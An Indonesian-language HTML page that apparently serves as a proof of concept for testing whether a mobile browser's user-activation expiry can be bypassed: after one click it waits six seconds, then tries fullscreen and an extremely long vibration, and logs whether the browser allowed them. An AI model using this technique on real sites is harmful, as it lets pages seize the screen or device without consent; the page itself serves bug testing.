<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uji Coba Bug: Async Gesture Expiry Bypass</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            padding: 20px;
            background-color: #f4f6f9;
            color: #333;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        button:hover {
            background-color: #0056b3;
        }
        #status-log {
            margin-top: 20px;
            padding: 15px;
            background: #222;
            color: #00ff00;
            font-family: monospace;
            text-align: left;
            border-radius: 6px;
            font-size: 12px;
            min-height: 100px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Browser Gesture Test</h2>
    <p>Gunakan tombol di bawah untuk menguji apakah browser Android Anda rentan terhadap <i>Async Expiry Bypass</i>.</p>
    
    <!-- Tombol Pemicu Utama -->
    <button id="testBtn">Mulai Pengujian (Klik 1x)</button>

    <h3>Konsol Log Logika:</h3>
    <div id="status-log">Menunggu klik dari Anda...</div>
</div>

<script>
    const logBox = document.getElementById('status-log');
    const testBtn = document.getElementById('testBtn');

    // Fungsi pembantu untuk mencetak log ke layar HP
    function writeLog(text) {
        logBox.innerHTML += "\n> " + text;
        console.log(text);
    }

    // Fungsi simulasi jeda waktu asinkron murni menggunakan Promise
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    testBtn.addEventListener('click', async () => {
        logBox.innerHTML = ""; // Bersihkan log lama
        writeLog("Tombol diklik. Token 'User Activation' aktif.");
        writeLog("Memulai jeda asinkron berantai (Total: 6 detik)...");

        // MENYIMPAN STATUS AKTIVASI SEBELUM DELAY (Untuk pengecekan internal)
        if (navigator.userActivation) {
            writeLog("Status Aktivasi Awal: " + navigator.userActivation.isActive);
        }

        // Trik Ekstraksi: Melakukan operasi asinkron bertingkat (Nested Promises)
        // Di sini kita memaksa browser menunggu total 6 detik.
        // Di browser yang aman, token interaksi HARUSNYA hangus setelah maksimal 5 detik.
        await sleep(3000);
        writeLog("...Sudah berjalan 3 detik...");
        await sleep(3000);
        writeLog("...Sudah berjalan 6 detik. Delay Selesai.");

        if (navigator.userActivation) {
            writeLog("Status Aktivasi Sekarang: " + navigator.userActivation.isActive);
        }

        writeLog("Mencoba mengeksekusi Fullscreen & Getar secara ilegal...");

        // 1. UJI COBA BYPASS FULLSCREEN
        try {
            if (document.documentElement.requestFullscreen) {
                await document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) {
                await document.documentElement.webkitRequestFullscreen();
            }
            writeLog("🚨 BUG COMFIRMED: Sukses tembus Fullscreen setelah 6 detik!");
        } catch (err) {
            writeLog("❌ Fullscreen diblokir (Perilaku Normal).");
        }

        // 2. UJI COBA BYPASS VIBRATE (GETAR)
        try {
            if (navigator.vibrate) {
                // Mencoba menggetarkan HP selama 2 detik
                let success = navigator.vibrate(999999999999999999);
                if (success) {
                    writeLog("🚨 BUG COMFIRMED: HP Anda bergetar tanpa gesture langsung!");
                } else {
                    writeLog("❌ Getar ditolak atau gagal.");
                }
            } else {
                writeLog("ℹ️ Browser tidak mendukung API Getar.");
            }
        } catch (err) {
            writeLog("❌ Gagal mengeksekusi Getar: " + err.message);
        }
    });
</script>

</body>
</html>
